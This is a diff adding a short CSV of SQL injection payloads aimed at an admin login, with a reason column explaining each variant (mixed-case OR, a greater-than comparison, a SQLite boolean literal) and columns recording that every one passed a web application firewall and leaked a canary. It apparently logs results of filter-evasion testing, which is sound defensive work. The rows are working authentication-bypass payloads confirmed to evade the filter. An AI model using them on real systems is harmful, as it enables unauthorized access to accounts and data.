@@ -1,0 +1,4 @@
+payload,reason,waf_passed,canary_leaked
+admin' oR 'a'='a'--,string tautology instead of numeric equality,True,True
+admin' oR 2>1--,greater-than comparison instead of equality,True,True
+admin' oR TRUE--,SQLite boolean literal instead of a comparison,True,True
